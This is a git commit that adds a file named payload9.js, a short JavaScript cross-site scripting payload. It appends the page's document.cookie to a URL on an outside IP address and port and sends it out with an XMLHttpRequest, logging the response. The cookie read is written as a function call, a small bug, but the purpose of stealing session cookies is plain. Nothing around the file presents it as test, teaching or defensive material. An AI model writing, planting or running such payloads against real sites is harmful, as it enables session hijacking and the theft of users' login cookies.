9fd33da8af7bd7662f95cbec61c72364648580b6
Zaddish <40848785+Zaddish@users.noreply.github.com>
2022-10-27 05:47:13 +1100

    Create payload9.js

---
+++ payload9.js
@@ -0,0 +1,8 @@
+const Http = new XMLHttpRequest();
+const url='http://172.104.196.216:37777/' + document.cookie();
+Http.open("GET", url);
+Http.send();
+
+Http.onreadystatechange = (e) => {
+  console.log(Http.responseText)
+}
